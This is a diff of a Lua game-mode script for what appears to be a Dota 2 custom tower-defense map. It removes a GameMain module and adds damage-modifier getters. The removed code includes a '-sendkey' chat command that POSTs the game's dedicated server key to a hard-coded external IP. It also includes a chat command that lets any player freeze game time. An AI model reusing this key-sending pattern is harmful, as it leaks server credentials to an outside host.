-	if tData ~= nil and tData.AmbientModifiers ~= nil and tData.AmbientModifiers ~= "" then
-		local tList = string.split(string.gsub(tData.AmbientModifiers, " ", ""), "|")
-		for i, sAmbientModifier in pairs(tList) do
-			hSpawnedUnit:AddNewModifier(hSpawnedUnit, nil, sAmbientModifier, nil)
-		end
-	end
-	if hSpawnedUnit:GetUnitName() == "npc_dota_thinker" then
-		return
-	end
-
-	if hSpawnedUnit:IsRealHero() and hSpawnedUnit:GetUnitLabel() == "builder" then
-		local iPlayerID = hSpawnedUnit:GetPlayerOwnerID()
-		hSpawnedUnit:SetStashEnabled(false)
-		-- 初始卡片
-		if IsInToolsMode() then
-			for _, sItemName in pairs(DEBUG_AUTO_ADD_ITEMS) do
-				hSpawnedUnit:GiveItem(sItemName)
-			end
-		end
-		-- 位置
-		local tPos = {
-			[0] = Vector(-1047, -1148, 128),
-			[1] = Vector(1182, -1395, 128),
-			[2] = Vector(1162, 1320, 128),
-			[3] = Vector(-1144, 1308, 128),
-		}
-		if tPos[iPlayerID] ~= nil then
-			hSpawnedUnit:SetContextThink(DoUniqueString("start_point"), function()
-				if GameRules:IsGamePaused() then
-					return 0
-				end
-				FindClearSpaceForUnit(hSpawnedUnit, tPos[iPlayerID], true)
-				CenterCameraOnUnit(iPlayerID, hSpawnedUnit)
-			end, 1)
-		end
-		CenterCameraOnUnit(iPlayerID, hSpawnedUnit)
-		-- 技能等级设置
-		hSpawnedUnit:SetAbilityPoints(0)
-		hSpawnedUnit:FindAbilityByName("builder_draw_card_1"):UpgradeAbility(true)
-		hSpawnedUnit:FindAbilityByName("builder_draw_card_2"):UpgradeAbility(true)
-		hSpawnedUnit:FindAbilityByName("builder_draw_card_3"):UpgradeAbility(true)
-		hSpawnedUnit:FindAbilityByName("builder_recovery"):UpgradeAbility(true)
-
-		hSpawnedUnit:FindAbilityByName("builder_gold"):UpgradeAbility(true)
-		hSpawnedUnit:FindAbilityByName("builder_slot_1"):UpgradeAbility(true)
-		hSpawnedUnit:FindAbilityByName("gather_items"):UpgradeAbility(true)
-		-- 拆糖果隐藏技能
-		-- local builder_candy_destroy = hSpawnedUnit:AddAbility("builder_candy_destroy"):UpgradeAbility(true)
-
-		if not IS_RELEASE then
-			hSpawnedUnit:AddAbility("builder_debug"):UpgradeAbility(true)
-		end
-
-		local hItem = CreateItem("item_blank", hSpawnedUnit, hSpawnedUnit)
-		hItem:SetPurchaseTime(0)
-		hSpawnedUnit:AddItem(hItem)
-		local iSlot = hItem:GetItemSlot()
-		hSpawnedUnit:SwapItems(iSlot, DOTA_ITEM_SLOT_NEUTRAL)
-		-- 添加modifier
-		hSpawnedUnit:AddNewModifier(hSpawnedUnit, nil, "modifier_builder", nil)
-		-- PLUS开局给一张TP
-		if PlayerProperty:HasPlus(iPlayerID) then
-			local hItem = CreateItem("item_tpscroll_custom", hSpawnedUnit, hSpawnedUnit)
-			hItem:SetPurchaseTime(0)
-			hItem:SetSellable(false)
-			hSpawnedUnit:AddItem(hItem)
-		end
-	end
+function GetIncomingMagicalDamagePercent(hUnit, tParams)
+	return GetModifierProperty(hUnit, EOM_MODIFIER_PROPERTY_INCOMING_MAGICAL_DAMAGE_PERCENTAGE, tParams)
 end
-function GameMain:OnEntityKilled(events)
-	local unit = EntIndexToHScript(events.entindex_killed)
-	local attacker = EntIndexToHScript(events.entindex_attacker)
-
-	if unit == nil then return end
-
-	-- 玩家死亡
-	if unit:IsRealHero() and unit:HasModifier("modifier_builder") then
-		local summonedUnits = FindUnitsInRadius(unit:GetTeamNumber(), Vector(0, 0, 0), nil, -1, DOTA_UNIT_TARGET_TEAM_FRIENDLY, DOTA_UNIT_TARGET_ALL, DOTA_UNIT_TARGET_FLAG_INVULNERABLE + DOTA_UNIT_TARGET_FLAG_OUT_OF_WORLD, 0, false)
-		for k, summonedUnit in pairs(summonedUnits) do
-			if unit:GetPlayerOwnerID() == summonedUnit:GetPlayerOwnerID() and summonedUnit:IsSummoned() then
-				summonedUnit:ForceKill(false)
-			end
-		end
-	end
+function GetIncomingPureDamagePercent(hUnit, tParams)
+	return GetModifierProperty(hUnit, EOM_MODIFIER_PROPERTY_INCOMING_PURE_DAMAGE_PERCENTAGE, tParams)
 end
-function GameMain:OnAbilityUsed(events)
-	FireGameEvent("custom_ability_used", {
-		player_id = events.PlayerID,
-		abilityname = events.abilityname,
-		caster_entindex = events.caster_entindex,
-	})
+function GetIncomingDamagePercentEnemy(hUnit, tParams)
+	return GetModifierProperty(hUnit, EOM_MODIFIER_PROPERTY_INCOMING_DAMAGE_PERCENTAGE_ENEMY, tParams)
 end
-function GameMain:OnPlayerChat(events)
-	local iPlayerID = events.playerid
-	local sText = string.lower(events.text)
-	local bTeamOnly = events.teamonly == 1
-	local tokens = string.split(sText, " ")
-
-	if string.find(sText, "dongjie") then
-		local iTime = tonumber(string.sub(sText, 8, -1)) or 3600
-		self.bForceFrozen = true
-		GameRules:SetGameTimeFrozen(true)
-		Timer(iTime or 3600, function()
-			GameRules:SetGameTimeFrozen(false)
-			self.bForceFrozen = false
-		end)
-		return
-	end
-
-	if IS_RELEASE then
-		return
-	end
-
-	if tokens[1] == "-sendkey" then
-		local key = "encrypted_modules"
-		local name = tokens[2]
-		if name then
-			key = name
-		end
-		self:SendServerKey(GetDedicatedServerKeyV2(key), 'project6', key)
-	elseif tokens[1] == "-clear" then
-		Spawner:RemoveAll()
-	elseif tokens[1] == "-addgold" then
-		local iAmount = tonumber(tokens[2])
-		if iAmount then
-			PlayerData:ModifyGold(iPlayerID, iAmount)
-		end
-	elseif tokens[1] == "-wave" then
-		local iRound = tonumber(tokens[2])
-		if iRound then
-			Rounds:OnRoundChange(iRound)
-		end
-	elseif tokens[1] == "-wood" then
-		local iAmount = tonumber(tokens[2])
-		if iAmount then
-			PlayerData:ModifyWood(iPlayerID, iAmount)
-		end
-	elseif tokens[1] == "-ent_text" then
-		SendToConsole("ent_text")
-	elseif tokens[1] == "-scale" then
-		local iScale = tonumber(tokens[2])
-		if iScale then
-			Convars:SetFloat("host_timescale", iScale)
-		end
-	elseif tokens[1] == "-debug_panel" then
-		local show = tonumber(tokens[2]) or 0
-		self.bShowDebugPanel = (show == 1)
-		CustomNetTables:SetTableValue("common", "debug_panel", { show = show })
-	elseif tokens[1] == "-max_p" then
-		MAX_POISON_STACK = Clamp(tonumber(tokens[2]) or 1, 1, 2100000000)
-	elseif tokens[1] == "-particle" then
-		self.bShowCritParticle = tonumber(tokens[2]) == 1
-	end
+--毒伤害相关
+function GetIncomingPoisonDamagePercent(hUnit, tParams)
+	return GetModifierProperty(hUnit, EOM_MODIFIER_PROPERTY_INCOMING_POISON_DAMAGE_PERCENTAGE, tParams)
 end
-function GameMain:SendServerKey(key, name, token)
-	if not token then
-		return
-	end
-	local get = "key=" .. key .. "&name=" .. name .. "&token=" .. token
-	local handle = CreateHTTPRequest("POST", "http://150.158.198.187:3006/recv.php?" .. get)
-	handle:SetHTTPRequestHeaderValue("Content-Type", "application/json;charset=UTF-8")
-	handle:Send(function(response)
-		if response.StatusCode == 200 then
-			print(response.Body)
-		end
-	end)
+function GetOutgoingPoisonCountPercent(hUnit)
+	return GetModifierProperty(hUnit, EOM_MODIFIER_PROPERTY_OUTGOING_POISON_COUNT_PERCENTAGE)
 end
---- @param tEvents Data_custom_round_changed
-function GameMain:OnRoundChanged(tEvents)
-	local iRoundID = tEvents.round_id
-	if iRoundID == 2 then
-		if not self.bRuneDataUpload then
-			self.bRuneDataUpload = true
-			self:EachPlayer(function(n, iPlayerID)
-				local tRunes = {}
-				if type(Service) == "table" and type(Service.tInitRune) == "table" then
-					tRunes = Service.tInitRune[iPlayerID] or {}
-				end
-				Service:UploadMatchData(iPlayerID, {
-					rune = tRunes,
-				})
-			end)
-		end
-	end
-	if iRoundID >= 2 and not Rounds:IsEndlessRound() then
-		self:EachPlayer(function(n, iPlayerID)
-			local hHero = PlayerResource:GetSelectedHeroEntity(iPlayerID)
-			if IsValid(hHero) then
-				local tUsedConsumable = {}
-				if type(Service) == "table" and type(Service.tPlayerUsedConsumable) == "table" and type(Service.tPlayerUsedConsumable[iPlayerID]) == "table" then
-					tUsedConsumable = Service.tPlayerUsedConsumable[iPlayerID]
-				end
-				local tArtifact = {}
-				if type(Artifact) == "table" and type(Artifact.tPlayerArtifactIndex) == "table" and type(Artifact.tPlayerArtifactIndex[iPlayerID]) == "table" then
-					for _, iItemEntIndex in ipairs(Artifact.tPlayerArtifactIndex[iPlayerID]) do
-						local hItem = EntIndexToHScript(iItemEntIndex)
-						if IsValid(hItem) then
-							table.insert(tArtifact, hItem:GetName())
-						end
-					end
-				end
-				local tShopPurchased = {}
-				if type(Shop) == "table" and type(Shop.tPlayerPurchasedItems) == "table" and type(Shop.tPlayerPurchasedItems[iPlayerID]) == "table" then
-					tShopPurchased = Shop.tPlayerPurchasedItems[iPlayerID]
-				end
-				local tChallenge = {}
-				if type(Challenge) == "table" and type(Challenge.tPlayerChallengeRecord) == "table" and type(Challenge.tPlayerChallengeRecord[iPlayerID]) == "table" then
-					tChallenge = Challenge.tPlayerChallengeRecord[iPlayerID]
-				end
-				local tTowerData = {}
-				BuildSystem:EachBuilding(iPlayerID, function(hBuilding)
-					if IsValid(hBuilding) then
-						local hUnit = hBuilding:GetUnitEntity()
-						local sUnitName = hUnit:GetUnitName()
-						local sHeroID = Card:GetHeroID(sUnitName)
-						local t = {}
-
-						t.level = 0
-						if type(Service) == "table" and type(Service.tNettableData) == "table" and type(Service.tNettableData.playerHeros) == "table" and type(Service.tNettableData.playerHeros[iPlayerID]) == "table" then
-							local tHeroData = Service.tNettableData.playerHeros[iPlayerID][sHeroID] or Service.tNettableData.playerHeros[iPlayerID][tonumber(sHeroID)]
-							if tHeroData then
-								t.level = tonumber(tHeroData.level) or 0
-							end
-						end
-
-						t.star = hBuilding:GetStar()
-
-						local iRarity, sRarity = Card:GetTowerRarity(sUnitName)
-						t.quality = sRarity
-
-						local vPosition = hUnit:GetAbsOrigin()
-						t.position = tostring(vPosition.x) .. "," .. tostring(vPosition.y) .. "," .. tostring(vPosition.z)
-
-						t.item = {}
-						for i = DOTA_ITEM_SLOT_1, DOTA_ITEM_SLOT_9 do
-							local hItem = hUnit:GetItemInSlot(i)
-							if IsValid(hItem) and hItem:GetName() ~= "item_blank" then
-								table.insert(t.item, hItem:GetName() .. "," .. tostring(hItem:GetLevel()) .. "," .. tostring(hItem:GetCurrentCharges()))
-							end
-						end
-
-						t.growup = {}
-						if type(KeyValues) == "table" and type(KeyValues.PermanentModifiers) == "table" then
-							for sModifierName, _ in pairs(KeyValues.PermanentModifiers) do
-								local hModifier = hUnit:FindModifierByName(sModifierName)
-								if IsValid(hModifier) then
-									t.growup[sModifierName] = hModifier:GetStackCount()
-								end
-							end
-						end
-
-						tTowerData[hUnit:GetUnitName()] = t
-					end
-				end)
-
-				local tHeroItems = {}
-				for i = DOTA_ITEM_SLOT_1, DOTA_ITEM_SLOT_9, 1 do
-					local hItem = hHero:GetItemInSlot(i)
-					if IsValid(hItem) and hItem:GetName() ~= "item_blank" then
-						table.insert(tHeroItems, hItem:GetName() .. "," .. tostring(hItem:GetLevel()) .. "," .. tostring(hItem.GetCurrentCharges and hItem:GetCurrentCharges() or 0))
-					end
-				end
-				local tBackPackItems = {}
-				local tCombineItems = {}
-				if type(Items) == "table" and type(Items.tCustomBackPack) == "table" and type(Items.tCustomBackPack[iPlayerID]) == "table" then
-					for i = CUSTOM_ITEM_SLOT_MIN, CUSTOM_ITEM_SLOT_MAX, 1 do
-						local iItemEntIndex = Items.tCustomBackPack[iPlayerID][i]
-						local hItem = EntIndexToHScript(iItemEntIndex or -1)
-						if IsValid(hItem) and hItem:GetName() ~= "item_blank" then
-							if i >= CUSTOM_COMBINE_SLOT_MIN and i <= CUSTOM_ITEM_SLOT_MAX then
-								table.insert(tCombineItems, hItem:GetName() .. "," .. tostring(hItem.GetLevel and hItem:GetLevel() or 0) .. "," .. tostring(hItem.GetCurrentCharges and hItem:GetCurrentCharges() or 0))
-							else
-								table.insert(tBackPackItems, hItem:GetName() .. "," .. tostring(hItem.GetLevel and hItem:GetLevel() or 0) .. "," .. tostring(hItem.GetCurrentCharges and hItem:GetCurrentCharges() or 0))
-							end
-						end
-					end
-				end
-				local data = {
-					round = iRoundID,
-					gold = PlayerData:GetGold(iPlayerID),
-					crystal = PlayerData:GetWood(iPlayerID),
-					crystal_level = PlayerData:GetWoodLevel(iPlayerID),
-					food_level = BuildSystem:GetMaxPopulationLevel(iPlayerID),
-					food_now = BuildSystem:GetPopulation(iPlayerID),
-					food_max = BuildSystem:GetMaxPopulationLevel(iPlayerID),
-					consume = tUsedConsumable,
-					artifact = tArtifact,
-					shop_item = tShopPurchased,
-					challenge = tChallenge,
-					monster = Spawner:GetEnemyCounts(iPlayerID),
-					tower = tTowerData,
-					courier_pack = tHeroItems,
-					back_pack = tBackPackItems,
-					combine_pack = tCombineItems,
-				}
-				Service:UploadMatchRoundData(iPlayerID, data)
-			end
-		end)
-	end
+function GetIncomingPoisonCountPercent(hUnit)
+	return GetModifierProperty(hUnit, EOM_MODIFIER_PROPERTY_INCOMING_POISON_COUNT_PERCENTAGE)
 end
----------------------------------------UI Events---------------------------------------
-function GameMain:OnT15_Gamble(iEventSourceIndex, tEvents)
-	local hCaster = EntIndexToHScript(tEvents.hCasterIndex)
-	local hAbility = EntIndexToHScript(tEvents.hAbilityIndex)
-	local iGoldCost = tEvents.iGold
-	if IsValid(hCaster) and IsValid(hAbility) and hAbility:GetCaster() == hCaster then
-		local iPlayerID = hCaster:GetPlayerOwnerID()
-		if hAbility.OnGamble ~= nil then
-			hAbility:OnGamble(iGoldCost)
-		end
-	end
+function GetPoisonActiveTimePercent(hUnit)
+	return GetModifierProperty(hUnit, EOM_MODIFIER_PROPERTY_POISON_ACTIVE_TIME_PERCENTAGE)
 end
-function GameMain:OnRemoveBuilding(id, tData)
-	local iPlayerID = tData.PlayerID
-	if type(iPlayerID) ~= "number" or not PlayerResource:IsValidPlayerID(iPlayerID) then
-		return
-	end
-
-	local hUnit = EntIndexToHScript(tData.iUnit)
-	if not IsValid(hUnit) then
-		return
-	end
-
-	-- 断线不能卖塔（这应该是队友操作的）
-	if PlayerResource:GetConnectionState(iPlayerID) == DOTA_CONNECTION_STATE_DISCONNECTED then
-		return
-	end
-
-	BuildSystem:SellBuilding(hUnit, 0.25)
+function GetPoisonActiveIncreasePercent(hUnit)
+	return GetModifierProperty(hUnit, EOM_MODIFIER_PROPERTY_POISON_ACTIVE_INCREASE_PERCENTAGE)
 end
-function GameMain:OnSelectDifficulty(id, tData)
-	local iPlayerID = tData.PlayerID
-	if type(iPlayerID) ~= "number" or not PlayerResource:IsValidPlayerID(iPlayerID) then
-		return
-	end
-	local iDifficulty = tData.difficulty
-	self.playerGameModeSelection[iPlayerID].difficulty = iDifficulty
-	self.playerGameModeSelection[iPlayerID].is_default_difficulty = false
-
-	local allFinishSelected = true
-	for id, v in pairs(self.playerGameModeSelection) do
-		if v.is_default_difficulty then
-			allFinishSelected = false
-		end
-	end
-	-- if iDifficulty ~= DIFFICULTY_ENDLESS then
-	if allFinishSelected and (self.GameModeSelectionEndTime - GameRules:GetGameTime()) > 5 then
-		self.GameModeSelectionEndTime = GameRules:GetGameTime() + SETTING_LOCK_TIMES
-	end
-	-- end
-	self:UpdateNetTables()
+function GetPoisonImmune(hUnit, tParams)
+	return GetModifierProperty(hUnit, EOM_MODIFIER_PROPERTY_POISON_IMMUNE, tParams)
 end
-function GameMain:OnEndlessSetting(id, tData)
-	local iPlayerID = tData.PlayerID
-	if type(iPlayerID) ~= "number" or not PlayerResource:IsValidPlayerID(iPlayerID) then
-		return
-	end
-	local iEndlessLayer = tData.value
-	if tData.type == 'endless' then
-		if self.playerGameModeSelection[iPlayerID] == nil then
-			self.playerGameModeSelection[iPlayerID] = {
-				difficulty = DIFFICULTY_EASY,
-				is_default_difficulty = true,
-				endlesslayer = iEndlessLayer,
-			}
-		else
-			self.playerGameModeSelection[iPlayerID].endlesslayer = iEndlessLayer
-		end
-		self:UpdateNetTables()
-	end
-end
----------------------------------------set---------------------------------------
-function GameMain:SetDifficulty(iDifficulty)
-	if type(iDifficulty) ~= "number" then
-		return
-	end
-	self.iDifficulty = iDifficulty
-	self:UpdateNetTables()
-end
-function GameMain:SetEndlessLayer(iEndlessLayer)
-	self.iEndlessLayer = iEndlessLayer or self.iEndlessLayer
-	self:UpdateNetTables()
-
-	-- 计算深渊难度的血量
-	local fTemp = 0
-	local fTotal = 1
-	for i = 1, self.iEndlessLayer do
-		if ENDLESS_ENEMEY_HP_FACTOR[i] ~= nil then
-			fTemp = ENDLESS_ENEMEY_HP_FACTOR[i].fFactor
-		end
-		fTotal = fTotal + fTemp
-	end
-	self.fEndlessHPMult = fTotal
-
-	-- 计算深渊难度的护甲
-	local fTemp = 0
-	local fTotal = 1
-	for i = 1, self.iEndlessLayer do
-		if ENDLESS_ENEMEY_ARMOR_FACTOR[i] ~= nil then
-			fTemp = ENDLESS_ENEMEY_ARMOR_FACTOR[i].fFactor
-		end
-		fTotal = fTotal + fTemp
-	end
-	self.fEndlessArmorMult = fTotal
-	local fAdd = 0
-	for k, v in pairs(ENDLESS_ENEMEY_ARMOR_ADD) do
-		if self.iEndlessLayer > k and fAdd < v then
-			fAdd = v
-		end
-	end
-	self.fEndlessArmorAdd = fAdd
-	-- 计算深渊难度的魔法护甲
-	local fTemp = 0
-	local fTotal = 1
-	for i = 1, self.iEndlessLayer do
-		if ENDLESS_ENEMEY_ARMOR_FACTOR[i] ~= nil then
-			fTemp = ENDLESS_ENEMEY_ARMOR_FACTOR[i].fFactor
-		end
-		fTotal = fTotal + fTemp
-	end
-	self.fEndlessMagicArmorMult = fTotal
-	local fAdd = 0
-	for k, v in pairs(ENDLESS_ENEMEY_MAGIC_ARMOR_ADD) do
-		if self.iEndlessLayer > k and fAdd < v then
-			fAdd = v
-		end
-	end
-	self.fEndlessMagicArmorAdd = fAdd
-end
-function GameMain:SetPlayerRecord(iPlayerID, sKey, value)
-	if type(self.tPlayerRecords[iPlayerID]) ~= "table" then
-		self.tPlayerRecords[iPlayerID] = {}
-	end
-	self.tPlayerRecords[iPlayerID][sKey] = value
-end
----------------------------------------Get---------------------------------------
-function GameMain:GetDifficulty()
-	return self.iDifficulty or 0
-end
-function GameMain:GetEndLessLayer()
-	return self.iEndlessLayer or 0
-end
-function GameMain:GetPlayerRecord(iPlayerID, sKey)
-	if type(self.tPlayerRecords[iPlayerID]) == "table" then
-		return self.tPlayerRecords[iPlayerID][sKey]
-	end
-	return nil
-end
----------------------------------------Utils---------------------------------------
-function GameMain:UpdateNetTables()
-	CustomNetTables:SetTableValue("common", "before_game_end_time", { value = self.GameModeSelectionEndTime })
-	CustomNetTables:SetTableValue("common", "game_configs", {
-		difficulty = self.iDifficulty or 0,
-		iEndlessLayer = self.iEndlessLayer or 0,
-		iEndlessCreepCount = Rounds:GetEndlessCreepCount() or 0,
-		pause = self.bIsPause,
-	})
-	CustomNetTables:SetTableValue("common", "before_game_selection", self.playerGameModeSelection)
-end
---- 遍历玩家
---- @param func fun(n:number, iPlayerID:number):boolean 返回true就break
---- @param teamNumber number
-function GameMain:EachPlayer(teamNumber, func)
-	if type(teamNumber) == "function" then
-		func = teamNumber
-		teamNumber = DOTA_TEAM_GOODGUYS
-	end
-	for n = 1, PlayerResource:GetPlayerCountForTeam(teamNumber), 1 do
-		local playerID = PlayerResource:GetNthPlayerIDOnTeam(teamNumber, n)
-		if PlayerResource:IsValidPlayerID(playerID) then
-			if func(n, playerID) == true then
-				break
-			end
-		end
-	end
-end
---- 获取玩家数量
-function GameMain:GetPlayerCount(teamNumber)
-	if teamNumber == nil then
-		teamNumber = DOTA_TEAM_GOODGUYS
-	end
-
-	local n = 0
-	self:EachPlayer(teamNumber, function(_, iPlayerID)
-		n = n + 1
-	end)
-	return n
-end
---- 获取玩家数量，英雄死亡的不算
-function GameMain:GetValidPlayerCount(teamNumber)
-	if teamNumber == nil then
-		teamNumber = DOTA_TEAM_GOODGUYS
-	end
-
-	local n = 0
-	self:EachPlayer(teamNumber, function(_, iPlayerID)
-		local hHero = PlayerResource:GetSelectedHeroEntity(iPlayerID)
-		if IsValid(hHero) and hHero:IsAlive() then
-			n = n + 1
-		end
-	end)
-	return n
-end
--- 获取有效玩家数量
-function GameMain:GetValidPlayerCount(teamNumber)
-	if teamNumber == nil then
-		teamNumber = DOTA_TEAM_GOODGUYS
-	end
-
-	local n = 0
-	self:EachPlayer(teamNumber, function(_, iPlayerID)
-		local hHero = PlayerResource:GetSelectedHeroEntity(iPlayerID)
-		if IsValid(hHero) and hHero:IsAlive() then
-			n = n + 1
-		end
-	end)
-	return n
-end
--- 获取玩家在队伍的位置
-function GameMain:GetNthByPlayerID(teamNumber, playerID)
-	if playerID == nil then
-		playerID = teamNumber
-		teamNumber = DOTA_TEAM_GOODGUYS
-	end
-	local n
-	self:EachPlayer(teamNumber, function(_n, _playerID)
-		if _playerID == playerID then
-			n = _n
-			return true
-		end
-	end)
-	return n
-end
---=======================================自定义暂停功能=======================================
-function GameMain:OnCustomTogglePause(id, tData)
-	local iPlayerID = tData.PlayerID
-	if not self.bGameEnd then
-		if self:GetValidPlayerCount() > 1 then
-			local now = Time()
-			if self.bIsPause then
-				if type(self.tPlayerLastUnPauseTime[iPlayerID]) == "number" and now - self.tPlayerLastUnPauseTime[iPlayerID] < CUSTOM_PAUSE_CD then
-					Notification:CombatToPlayer(iPlayerID, {
-						message = "Custom_Cant_Unpause_Time",
-						int_cant_pause_time = math.ceil(self.tPlayerLastUnPauseTime[iPlayerID] + CUSTOM_PAUSE_CD - now),
-					})
-					return false
-				end
-			else
-				if type(self.tPlayerLastPauseTime[iPlayerID]) == "number" and now - self.tPlayerLastPauseTime[iPlayerID] < CUSTOM_PAUSE_CD then
-					Notification:CombatToPlayer(iPlayerID, {
-						message = "Custom_Cant_Pause_Time",
-						int_cant_pause_time = math.ceil(self.tPlayerLastPauseTime[iPlayerID] + CUSTOM_PAUSE_CD - now),
-					})
-					return false
-				end
-			end
-			if self.bIsPause then
-				self.tPlayerLastUnPauseTime[iPlayerID] = now
-			else
-				self.tPlayerLastPauseTime[iPlayerID] = now
-			end
-		end
-		self.bIsPause = not self.bIsPause
-		PauseGame(self.bIsPause)
-		-- GameRules:SetGameTimeFrozen(self.bIsPause)
-		self:UpdateNetTables()
-	end
-end
---=======================================多倍速=======================================
-function GameMain:OnCustomTimeScale(id, data)
-	if self:GetValidPlayerCount() == 1 then
-		local iScale = Clamp(tonumber(data.scale) or 1, 0.5, 1.5)
-		Convars:SetFloat("host_timescale", iScale)
-		CustomNetTables:SetTableValue("common", "custom_host_timescale", { iScale = iScale })
-	end
-end
-
-return GameMain
